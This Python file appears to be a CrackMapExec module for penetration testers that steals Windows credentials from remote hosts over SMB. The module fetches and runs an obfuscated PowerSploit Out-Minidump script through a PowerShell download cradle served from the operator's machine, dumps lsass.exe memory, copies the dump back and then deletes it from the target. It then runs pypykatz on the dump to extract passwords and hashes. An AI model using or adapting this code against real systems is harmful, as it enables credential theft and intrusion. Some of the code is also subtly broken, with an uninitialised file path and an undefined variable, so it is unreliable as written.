from cme.helpers.powershell import *
from StringIO import StringIO
import os
import sys
from subprocess import call

class CMEModule:
    '''
        Invoke minidump on lsass.exe & download process dump & invoke pypykatz in ordner to decrypt passwords from memory safely without execute mimikatz on target system
        Module by evait security GmbH (https://github.com/evait-security/) (https://gitlab.com/evait-security/) (https://www.evait.de)
    '''

    name = 'minidump_pypykatz'
    description = "Invoke minidump & get dumpfile & invoke pypykatz"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
            TMP_DIR      Path where process dump should be saved on target system (default: C:\\Windows\\Temp\\)
            NOAUTOEXEC      If unset pypykatz will be invoked directly after download the dump (default: not set)
        '''

        self.tmp_dir = "C:\\Windows\\Temp\\"

        if 'TMP_DIR' in module_options:
            self.tmp_dir = module_options['TMP_DIR']

        self.autoexec = True

        if 'NOAUTOEXEC' in module_options:
            self.autoexec = False

        self.ps_script = obfs_ps_script('powersploit/Exfiltration/Out-Minidump.ps1')

    def on_admin_login(self, context, connection):
        try:
            command = "Get-Process lsass | Out-Minidump -DumpFilePath %s" % (self.tmp_dir)
            launcher = gen_ps_iex_cradle(context, 'Out-Minidump.ps1', command)
            connection.ps_execute(launcher, methods=['smbexec'])

            if not self.file_path is None:
                minidump_local_filepath = os.path.join(context.log_folder_path, 'minidump_{}.dmp'.format(connection.host))
                with open(minidump_local_filepath, 'w+') as minidump_local_file:
                    try:
                        connection.conn.getFile('C$', self.file_path, minidump_local_file.write)
                        context.log.success('Dumpfile of lsass.exe was transferred to %s' % minidump_local_filepath)
                    except Exception as e:
                        context.log.error('Error while get file: {}'.format(e))

                    try:
                        context.log.info('Try to delete dumpfile ...')
                        connection.conn.deleteFile('C$', self.file_path)
                        context.log.success('Dumpfile was deleted')
                    except Exception as e:
                        context.log.error('Error while delete file: {}'.format(e))
            
            try:
                if self.autoexec:
                    context.log.info('Invoke pypykatz in order to extract the credentials ...')
                    call("pypykatz minidump %s" % minidump_local_filepath, shell=True)
                else:
                    context.log.info('To extract creds execute "pypykatz minidump %s"' % minidump_local_filepath)

            except Exception as e:
                context.log.error('Error while execute pypykatz: {}'.format(e))
                context.log.error('Please make sure pypykatz is installed (pip3 install pypykatz)')

        except Exception as e:
            context.log.error('Error while execute launcher: {}'.format(e))
            context.log.error('Please retry your command')
            response.stop_tracking_host()


    def on_request(self, context, request):
        if 'Out-Minidump.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(self.ps_script)

        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.getheader('content-length'))
        data = response.rfile.read(length)

        response.stop_tracking_host()

        if len(data) > 0:
            if self.tmp_dir in data:
                self.file_path = data.split(":")[1].replace('\\','/')
                context.log.success('Executed Out-Minidump on lsass.exe to C:%s' % (self.file_path))
                context.log.info("Try to download the dump file ...") 